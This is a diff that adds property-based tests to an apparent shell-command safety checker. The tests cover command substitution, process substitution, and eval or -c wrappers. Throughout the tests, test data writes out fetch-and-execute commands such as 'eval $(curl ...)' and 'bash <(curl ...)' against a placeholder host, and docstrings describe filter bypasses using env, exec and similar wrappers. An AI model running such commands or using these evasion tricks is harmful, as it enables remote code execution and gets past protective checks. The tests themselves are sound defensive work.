@@ -760,3 +760,204 @@ def test_rule_git_push_detects_git_and_push_each_fused_with_a_literal_prefix(
     name_to_value = {g_var: "t", p_var: "sh"}
     segments = [[f"gi${{!{g_ref}}}", f"pu${{!{p_ref}}}", "origin", "main"]]
     assert checker._rule_git_push(segments, name_to_value, name_to_raw_value) is not None
+
+
+# --- Issue #1326 Stage 1, fourteenth round: command-substitution folding, ---
+# the recursive inner-content check, and the process-substitution/eval/-c
+# fetch-exec detection this round added -------------------------------------
+
+
+@_PROPERTIES
+@given(a=_IDENTIFIERS, b=_IDENTIFIERS)
+def test_command_substitution_token_span_finds_the_matching_close_paren(a: str, b: str) -> None:
+    """Model-based: a `$`-suffixed opener token immediately followed by a
+    `(` token returns the index one past the matching `)`, tracking
+    nesting depth across the intervening tokens -- shared by
+    ``_fold_command_substitution_spans`` and ``_rule_command_substitution_
+    content``, added by Step 8 independent review, fourteenth round (issue
+    #1326)."""
+    tokens = ["x=$", "(", a, b, ")", "trailing"]
+    assert checker._command_substitution_token_span(tokens, 0) == 5
+
+
+@_PROPERTIES
+@given(a=_IDENTIFIERS)
+def test_command_substitution_token_span_none_for_a_non_opener(a: str) -> None:
+    """No false positive: a token that does not end with `$`, or is not
+    immediately followed by a `(` token, never starts a span."""
+    assert checker._command_substitution_token_span([a, "(", "y", ")"], 0) is None
+
+
+@_PROPERTIES
+@given(a=_IDENTIFIERS, inner=_IDENTIFIERS)
+def test_fold_command_substitution_spans_merges_into_one_dynamic_token(a: str, inner: str) -> None:
+    """Model-based: an unquoted `$(...)` span (split by shlex into
+    separate `$`/`(`/.../`)` tokens) folds into ONE opaque token that
+    ``_is_dynamic`` still recognizes, keeping any literal text before or
+    after it in its OWN, unmerged position."""
+    tokens = [a, "$", "(", inner, ")"]
+    folded = checker._fold_command_substitution_spans(tokens)
+    assert folded == [a, f"$( {inner})"]
+    assert checker._is_dynamic(folded[1])
+
+
+@_PROPERTIES
+@given(inner=_IDENTIFIERS)
+def test_find_fused_command_substitution_extracts_the_quoted_span(inner: str) -> None:
+    """Model-based: the QUOTED shape shlex leaves fused as one token
+    (`"prefix $(cmd) suffix"` dequotes to one token) is found via a
+    character-level scan, distinct from the unquoted, cross-token shape
+    ``_command_substitution_token_span`` handles."""
+    token = f"prefix $({inner}) suffix"
+    fused = checker._find_fused_command_substitution(token)
+    assert fused is not None
+    start, end = fused
+    assert token[start + 2 : end - 1] == inner
+
+
+@_PROPERTIES
+@given(tool=st.sampled_from(["curl", "wget"]))
+def test_is_unresolvable_substitution_detects_command_substitution(tool: str) -> None:
+    """Model-based: a token containing `$(` (a command substitution) is
+    always flagged unresolvable -- the narrow, position-specific guard
+    used at the checked seg[0]/interp-candidate positions, NOT inside the
+    shared, whole-segment `_substitute_var_refs_candidates` primitive
+    itself (see that function's own docstring for the false-positive
+    history behind this split)."""
+    assert checker._is_unresolvable_substitution(f"$( {tool} https://example.invalid/x.sh)")
+
+
+@_PROPERTIES
+@given(value=_VALUES)
+def test_is_unresolvable_substitution_allows_an_ordinary_dynamic_token(value: str) -> None:
+    """No false positive: an ordinary `$NAME` reference (resolvable
+    through `_substitute_var_refs_candidates`'s own machinery) is never
+    flagged by this narrower check."""
+    assert not checker._is_unresolvable_substitution(f"${value}")
+
+
+@_PROPERTIES
+@given(tool=st.sampled_from(["curl", "wget"]), interpreter=st.sampled_from(["sh", "bash", "zsh", "dash"]))
+def test_rule_command_substitution_content_detects_an_embedded_fetch_exec_pipe(tool: str, interpreter: str) -> None:
+    """Model-based, regression pin for the real REGRESSION found live by
+    Step 8 independent review, fourteenth round (issue #1326): bash
+    genuinely RUNS a `$(...)` substitution's own inner content the instant
+    it is evaluated, regardless of where its output is used afterward --
+    `$(curl <url> | bash)` embeds exactly the same fetch-exec pipe
+    `_rule_fetch_exec` already denies at the top level, and must be denied
+    here too."""
+    tokens = ["echo", "$", "(", tool, "https://example.invalid/x.sh", "|", interpreter, ")"]
+    assert checker._rule_command_substitution_content(tokens) is not None
+
+
+@_PROPERTIES
+@given(value=_VALUES)
+def test_rule_command_substitution_content_allows_harmless_inner_content(value: str) -> None:
+    """No false positive: a `$(...)` substitution whose own inner content
+    is an ordinary, harmless command (not itself a denied pattern) is
+    never flagged by this recursive check."""
+    tokens = ["echo", "$", "(", "date", value, ")"]
+    assert checker._rule_command_substitution_content(tokens) is None
+
+
+@_PROPERTIES
+@given(interpreter=st.sampled_from(["sh", "bash", "zsh", "dash"]))
+def test_skip_fetch_exec_wrapper_skips_env_command_exec(interpreter: str) -> None:
+    """Model-based, regression pin for the real bypass found live by Step
+    8 independent review, fourteenth round (issue #1326): `env`/
+    `command`/`exec` prepend an interpreter the identical way `sudo`
+    already does -- confirmed live via real bash argv expansion that
+    each genuinely runs the interpreter that follows."""
+    for wrapper in ("env", "command", "exec", "sudo"):
+        assert checker._skip_fetch_exec_wrapper([wrapper, interpreter]) == 1
+
+
+@_PROPERTIES
+@given(interpreter=st.sampled_from(["sh", "bash", "zsh", "dash"]))
+def test_fetch_exec_cand_is_interp_detects_a_literal_interpreter(interpreter: str) -> None:
+    """Model-based: a literal (case-insensitive) recognized interpreter
+    token is always detected as an interpreter candidate."""
+    assert checker._fetch_exec_cand_is_interp(interpreter.upper(), {}, {})
+
+
+@_PROPERTIES
+@given(other=st.sampled_from(["python3", "node", "cat", "tee"]))
+def test_fetch_exec_cand_is_interp_allows_a_non_interpreter(other: str) -> None:
+    """No false positive: a literal command word that is not one of the
+    four recognized shell interpreters is never treated as one."""
+    assert not checker._fetch_exec_cand_is_interp(other, {}, {})
+
+
+@_PROPERTIES
+@given(tool=st.sampled_from(["curl", "wget"]), interpreter=st.sampled_from(["sh", "bash", "zsh", "dash"]))
+def test_process_sub_feeds_fetch_tool_detects_fused_process_substitution(tool: str, interpreter: str) -> None:
+    """Model-based, regression pin for the real bypass found live by Step
+    8 independent review, fourteenth round (issue #1326): shlex fuses
+    `<(`/`>(` into ONE punctuation token (unlike `$(`, where `$` is not a
+    punctuation character) -- confirmed live via a real bash proxy that
+    `bash <(curl <url>)` genuinely runs the fetched payload."""
+    for opener in ("<(", ">("):
+        rest = [opener, tool, "https://example.invalid/x.sh", ")"]
+        assert checker._process_sub_feeds_fetch_tool(rest, {}, {})
+
+
+@_PROPERTIES
+@given(other=st.sampled_from(["python3", "node", "cat"]))
+def test_process_sub_feeds_fetch_tool_allows_a_non_fetch_head(other: str) -> None:
+    """No false positive: a process substitution whose own first token is
+    not curl/wget is never flagged."""
+    rest = ["<(", other, "file.txt", ")"]
+    assert not checker._process_sub_feeds_fetch_tool(rest, {}, {})
+
+
+@_PROPERTIES
+@given(tool=st.sampled_from(["curl", "wget"]))
+def test_fetch_tool_head_detects_a_literal_fetch_tool(tool: str) -> None:
+    """Model-based: TOKENS' own first segment starting with a literal
+    (case-insensitive) curl/wget is always detected -- used by
+    ``_rule_eval_or_dashc_fetch_exec`` to check a `$(...)` substitution's
+    own inner head without duplicating ``_rule_fetch_exec``'s own
+    curl/wget-detection logic."""
+    assert checker._fetch_tool_head([tool.upper(), "https://example.invalid/x.sh"])
+
+
+@_PROPERTIES
+@given(other=st.sampled_from(["echo", "date", "cat"]))
+def test_fetch_tool_head_allows_a_non_fetch_head(other: str) -> None:
+    """No false positive: an ordinary, non-fetch first command is never
+    flagged."""
+    assert not checker._fetch_tool_head([other, "hello"])
+
+
+@_PROPERTIES
+@given(tool=st.sampled_from(["curl", "wget"]))
+def test_rule_eval_or_dashc_fetch_exec_detects_eval_command_substitution(tool: str) -> None:
+    """Model-based, regression pin for the real bypass found live by Step
+    8 independent review, fourteenth round (issue #1326): `eval $(curl
+    <url>)` fetches a payload and feeds its OUTPUT directly to `eval` as
+    the command text to run -- confirmed live via a real bash proxy that
+    `eval $(echo "echo PWNED")` genuinely runs the substituted text."""
+    segments = [["eval", f"$( {tool} https://example.invalid/x.sh)"]]
+    assert checker._rule_eval_or_dashc_fetch_exec(segments) is not None
+
+
+@_PROPERTIES
+@given(tool=st.sampled_from(["curl", "wget"]), interpreter=st.sampled_from(["sh", "bash", "zsh", "dash"]))
+def test_rule_eval_or_dashc_fetch_exec_detects_dashc_command_substitution(tool: str, interpreter: str) -> None:
+    """Model-based, regression pin for the real bypass found live by Step
+    8 independent review, fourteenth round (issue #1326): `bash -c
+    "$(curl <url>)"` is the same fetch-exec pattern as `eval`, via an
+    interpreter's own `-c` flag instead -- confirmed live via a real bash
+    proxy that `bash -c "$(echo 'echo PWNED')"` genuinely runs the
+    substituted text."""
+    segments = [[interpreter, "-c", f"$( {tool} https://example.invalid/x.sh)"]]
+    assert checker._rule_eval_or_dashc_fetch_exec(segments) is not None
+
+
+@_PROPERTIES
+@given(value=_VALUES)
+def test_rule_eval_or_dashc_fetch_exec_allows_harmless_eval(value: str) -> None:
+    """No false positive: `eval`/`-c` fed a `$(...)` substitution whose
+    own inner content is harmless (not curl/wget-headed) stays allowed."""
+    segments = [["eval", f"$( echo {value})"]]
+    assert checker._rule_eval_or_dashc_fetch_exec(segments) is None
